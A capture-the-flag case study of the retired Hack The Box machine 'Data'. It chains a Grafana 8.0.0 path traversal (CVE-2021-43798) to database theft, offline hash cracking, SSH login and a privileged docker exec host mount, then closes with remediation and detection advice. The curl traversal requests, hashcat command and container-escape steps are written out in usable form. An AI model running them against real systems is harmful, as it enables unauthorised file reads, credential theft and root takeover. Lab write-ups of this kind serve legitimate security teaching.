---
title: "Data — Grafana Path Traversal to Docker Container Escape"
description: "Grafana path traversal (CVE-2021-43798) extracts the application database for offline credential cracking, and a permissive docker exec sudo rule mounts the host filesystem to reach root."
type: case-study
platform: Hack The Box
content_type: machine
status: published-ready
addedAt: "2026-09-14"
tags:
  - linux
  - grafana
  - cve
  - container-escape
  - docker
objective: "Escalate from an unauthenticated Grafana path traversal to root through credential recovery and a permissive docker exec sudo rule"
tools:
  - rustscan
  - curl
  - sqlite3
  - hashcat
  - ssh
  - docker
skill: "Web path traversal, credential recovery, and container escape"
outcome: "Authenticated SSH access as a low-privileged user and root-level access to the host filesystem through a privileged container"
---

## At a glance

| Field | Value |
|---|---|
| Difficulty | Easy |
| Target environment | Linux host running Grafana 8.0.0 (Grafana process inside a container) |
| Starting position | Unauthenticated network access |
| Objective | Escalate from an unauthenticated Grafana file read to root on the host |
| Outcome | User SSH access and root-level host filesystem access via a privileged `docker exec` |

## Grafana traversal to privileged container escape

Data is a retired Hack The Box Linux machine running Grafana 8.0.0. The release is vulnerable to CVE-2021-43798, an unauthenticated path traversal in Grafana plugin asset paths that reads arbitrary files; the most useful target is the Grafana SQLite database holding password hashes and salts. A cracked credential authenticates over SSH, and a permissive sudo rule for `docker exec` lets that user enter the Grafana container as root, mount the host filesystem, and reach root-owned files. Target identifiers, credentials, and secret values are replaced with role-based placeholders; command syntax is preserved. See [how evidence is handled](/method/).

**Attack path:** **Grafana 8.0.0 → CVE-2021-43798 path traversal → `grafana.db` exfiltration → offline hash cracking → SSH as `boris` → sudo `docker exec` into a privileged container → host filesystem mount → root**

## Containerized Grafana 8.0.0, no credentials, host root

- **Target:** a Linux host running Grafana 8.0.0 inside a container, with no patch applied.
- **Exposed services:** SSH (22) and Grafana HTTP (3000).
- **Starting position:** unauthenticated network access, with no provided credentials.
- **Objective:** move from an unauthenticated application file read to user access and root, and demonstrate the impact of an over-permissive container privilege rule.
- **Constraints:** activity was confined to the Hack The Box lab environment.

## Evidence: traversal to hash crack to privileged mount

### 1. Service Enumeration

Observation: a full scan exposes two services, one of them the vulnerable Grafana release.

```bash
rustscan -a <TARGET_IP> --ulimit 5000 -- -Pn -sC -sV -oN <OUT_PREFIX>
```

Truncated scan output:

```text
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7
3000/tcp open  http    Grafana http
```

The Grafana login page discloses the running build:

```text
v8.0.0 (41f0542c1e)
```

Significance: Grafana 8.0.0 is within the affected range for CVE-2021-43798, and SSH is the interactive access service the recovered credential will target.

Result: SSH and Grafana are identified, and the login page confirms the vulnerable Grafana version without deeper fingerprinting.

### 2. CVE-2021-43798: Grafana Path Traversal

Observation: Grafana serves plugin static assets from `public/plugins/<PLUGIN_ID>/` without normalizing `../` sequences, so a crafted path escapes the plugins directory and reads arbitrary files.

```bash
curl --path-as-is \
  "http://<TARGET_IP>:3000/public/plugins/<PLUGIN_ID>/../../../../../../../../etc/passwd"
```

The response returns the requested file:

```text
root:x:0:0:root:/root:/bin/ash
bin:x:1:1:bin:/bin:/sbin/nologin
...
```

Significance: the traversal needs no authentication, and the `/bin/ash` shell in the password entry indicates the Grafana process runs in an Alpine-based container. The application database is then retrieved through the same primitive:

```bash
curl -o grafana.db --path-as-is \
  "http://<TARGET_IP>:3000/public/plugins/<PLUGIN_ID>/../../../../../../../../var/lib/grafana/grafana.db"
```

Result: the traversal confirms unauthenticated arbitrary file read and exfiltrates `grafana.db` for offline analysis.

### 3. Grafana Database Analysis

Observation: Grafana stores local user records in the SQLite database, including the password verification material.

```bash
sqlite3 grafana.db
sqlite> .tables
sqlite> select login,email,password,salt from user;
```

The query returns records for two accounts (hash and salt values redacted):

```text
admin | <ADMIN_HASH> | <ADMIN_SALT>
boris | <BORIS_HASH> | <BORIS_SALT>
```

Significance: Grafana derives these values with PBKDF2-SHA256, stored as `sha256:10000:<base64 salt>:<base64 hash>`, which matches Hashcat mode 10900 once the salt and hash are base64-encoded into that layout.

```bash
hashcat -m 10900 grafana.hash /usr/share/wordlists/rockyou.txt
```

The crack recovers one plaintext value:

```text
boris:<BORIS_PASSWORD>
```

Result: the crack recovers a credential for `boris`; the next stage confirms authentication.

### 4. SSH Access

Observation: SSH is exposed on port 22, and the recovered credential is reused against it.

```bash
ssh boris@<TARGET_IP>
```

Authentication returns a shell:

```text
boris@data:~$
```

Significance: the credential recovered from `grafana.db` authenticates directly over SSH, which confirms cross-service reuse of the same secret.

Result: SSH returns an authenticated user-level shell as `boris`.

### 5. Privilege Escalation: Sudo Docker Rights

Observation: I checked the user's sudo policy for delegable root commands.

```bash
sudo -l
```

```text
User boris may run the following commands on localhost:
    (root) NOPASSWD: /snap/bin/docker exec *
```

Significance: the rule grants passwordless `docker exec` as root. The target container name is recovered through the same path-traversal primitive:

```bash
curl --path-as-is \
  "http://<TARGET_IP>:3000/public/plugins/<PLUGIN_ID>/../../../../../../../../etc/hostname"
```

```text
<CONTAINER_ID>
```

Action, shown as placeholder patterns:

```bash
sudo /snap/bin/docker exec -u root --privileged -it <CONTAINER_ID> sh
```

```bash
fdisk -l
mkdir /mnt/host
mount /dev/sda1 /mnt/host
```

I could not verify the mount from separate command output; the notes report that the host root filesystem mounted successfully from inside the privileged container.

Significance: a `docker exec` granted `--privileged`, reachable through the passwordless sudo rule, exposes the host block devices, so mounting them from the container gives read and write access to host-owned files.

Result: the container gives root-equivalent access to the host filesystem.

## Obstacles: no host shell, only delegated docker exec

| Challenge | Decision | Rationale |
|---|---|---|
| No host shell, but a sudo rule for `docker exec` | Reused the path-traversal file read to obtain the container hostname, then targeted that container | The sudo rule applies to `docker exec`, so the running container identity had to be established first |
| Identifying the vulnerable Grafana release | Read the version banner from the login page | Grafana 8.0.0 is directly in the CVE-2021-43798 affected range, so no deeper fingerprinting was needed |

## Outcome: unauthenticated file read and host root access

The documented path starts with unauthenticated arbitrary file read through CVE-2021-43798, continues through offline recovery of a Grafana credential that authenticates over SSH, and reaches root-level access to the host filesystem through a privileged `docker exec` into the Grafana container. No further host privilege-escalation technique was required once the container was reachable under the delegated `docker exec` rule.

## Recommendations: unpatched Grafana, exposed database, docker exec grant

The demonstrated paths motivate the controls below, which this case study did not validate.

1. **Vulnerable Grafana release.** Grafana 8.0.0 ships within the CVE-2021-43798 affected range, allowing unauthenticated file read through plugin asset paths. *Recommendation:* upgrade to a patched release (8.0.7, 8.1.8, 8.2.7, or 8.3.1) and track the vendor advisory. *Detection:* inspect requests to `public/plugins/` for `../` traversal sequences and alert when they occur.
2. **Application secrets reachable in `grafana.db`.** Local user password hashes and salts could be exfiltrated and cracked offline. *Recommendation:* limit filesystem exposure from the web service, rotate affected credentials, and never reuse Grafana account passwords for SSH. *Detection:* monitor for large reads of `grafana.db` and for its retrieval by the Grafana service account.
3. **Permissive `docker exec` sudo rule.** Passwordless `docker exec` as root, combined with a container holding host device access, yielded root on the host. *Recommendation:* do not allow `--privileged` in the delegated `docker exec` or expose host device mounts. *Detection:* treat privileged `docker exec *` sudo grants and `--privileged` container starts as findings to review.
4. **Container identifier disclosure via file read.** The same traversal leaked the container hostname, enabling precise targeting of `docker exec`. *Recommendation:* fixing the underlying traversal removes this reconnaissance step; restrict service account visibility into container metadata.

## References

- [Hack The Box — Data](https://app.hackthebox.com/machines/Data) (retired machine)
- [NVD — CVE-2021-43798](https://nvd.nist.gov/vuln/detail/CVE-2021-43798) (Grafana path traversal)
- [Grafana Security Advisory — GHSA-8pjx-jj86-j47p](https://github.com/grafana/grafana/security/advisories/GHSA-8pjx-jj86-j47p) (vendor advisory for CVE-2021-43798)
- [Grafana — release with the CVE-2021-43798 fix](https://grafana.com/blog/grafana-8-3-1-8-2-7-8-1-8-and-8-0-7-released-with-high-severity-security-fix/) (vendor fix announcement)
- [RustScan](https://github.com/bee-san/RustScan) (fast port scanner)
- [curl — man page](https://curl.se/docs/manpage.html) (HTTP client used for the path-traversal requests)
- [SQLite — Command-Line Shell](https://sqlite.org/cli.html) (`sqlite3` interactive queries)
- [Hashcat](https://hashcat.net/hashcat/) (offline password cracking)
- [OpenSSH — manual pages](https://www.openssh.com/manual.html) (SSH client)
- [Docker — daemon access control](https://docs.docker.com/engine/security/protect-access/) (restrict access to the Docker daemon)
